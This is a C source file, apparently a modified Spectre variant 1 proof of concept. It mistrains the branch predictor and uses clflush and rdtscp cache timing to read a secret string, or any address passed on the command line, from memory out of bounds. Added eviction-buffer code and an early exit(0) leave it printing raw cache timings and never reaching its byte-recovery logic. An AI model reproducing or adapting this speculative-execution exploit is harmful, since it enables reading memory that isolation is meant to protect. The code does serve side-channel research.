#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

//flang++++++++
/*
#define LLC_off_bits 6
#define LLC_set_bits 14
#define LLC_asso 6
#define LLC_SIZE ((1<<(LLC_off_bits+LLC_set_bits))*LLC_asso)
#define LLC_entry_SIZE ((1<<(LLC_set_bits))*LLC_asso)
#define LLC_1asso_SIZE (1<<(LLC_off_bits+LLC_set_bits))
#define LLC_1asso_entry_SIZE ((1<<(LLC_set_bits)))
*/
#define LLC_SIZE (2<<20)
uint8_t *array_evict;
//flang---------

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "Ahe Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* To not optimize out victim_function() */
int time_output = 1;

void victim_function(size_t x) {
  if (x < array1_size) {
    temp &= array2[array1[x] * 512];
  }
}
/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2],int score[2]) 
{
  //flang++++
  int flush_evict=1;
  int flush_mixorder=0;
  int max_tries=9;
  //flang----
  static int results[256];
  unsigned long time_buffer[256];
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = max_tries; tries > 0; tries--) {
    for (i = 0; i < LLC_SIZE; i++) 
      array_evict[i]=0;

    /* 5 trainings (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
      _mm_clflush(&array1_size);
      for (volatile int z = 0; z < 100; z++) {
      } /* Delay (can also mfence) */

      /* Bit twiddling to set x=training_x if j % 6 != 0
      * or malicious_x if j % 6 == 0 */
      /* Avoid jumps in case those tip off the branch predictor */
      /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = ((j % 6) - 1) & ~0xFFFF;
      /* Set x=-1 if j&6=0, else x=0 */
      x = (x | (x >> 16));
      x = training_x ^ (x & (malicious_x ^ training_x));
      /* Call the victim! */
      victim_function(x);
    }

    /* Time reads. Mixed-up order to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &array2[mix_i * 512];
      time1 = __rdtscp(&junk);
      junk = *addr;    /* Time memory access */
      time2 = __rdtscp(&junk) - time1; /* Compute elapsed time */
      //if (time_output) printf("%ld\n", time2);
      time_buffer[mix_i] = time2;
      if (time2 <= CACHE_HIT_THRESHOLD &&
          mix_i != array1[tries % array1_size])
        results[mix_i]++; /* cache hit -> score +1 for this value */
    }

    for (int i = 0; i < 256; i++) {
      printf("index#%d: %ld\n", i, time_buffer[i]);
    }
    
    exit(0);

    /* Locate highest & second-highest results */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) ||
        (results[j] == 2 && results[k] == 0))
      break; /* Success if best is > 2*runner-up + 5 or 2/0) */
  }
  /* use junk to prevent code from being optimized out */
  results[0] ^= junk;
  value[0] = (uint8_t)j;
  score[0] = results[j];
  value[1] = (uint8_t)k;
  score[1] = results[k];
}

int main(int argc, const char **argv) {
  size_t malicious_x =
      (size_t)(secret - (char *)array1); /* default for malicious_x */
  int i, score[2], len = 40;
  uint8_t value[2];

  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1; /* write to array2 to ensure it is memory backed */
  if (argc == 3) {
    sscanf(argv[1], "%p", (void **)(&malicious_x));
    malicious_x -= (size_t)array1; /* Input value to pointer */
    sscanf(argv[2], "%d", &len);
  }

  //flang++++++
  array_evict=(uint8_t*)malloc(LLC_SIZE);

  printf("Reading %d bytes:\n", len);
  while (--len >= 0) {
    //printf("Reading at malicious_x = %p... ", (void *)malicious_x);
    readMemoryByte(malicious_x++, value, score);
    printf("%s: ", score[0] >= 2 * score[1] ? "Success" : "Unclear");
    printf("0x%02X=’%c’ score=%d    ", value[0],
        (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X score=%d)", value[1], score[1]);
    printf("\n");
  }
  return (0);
}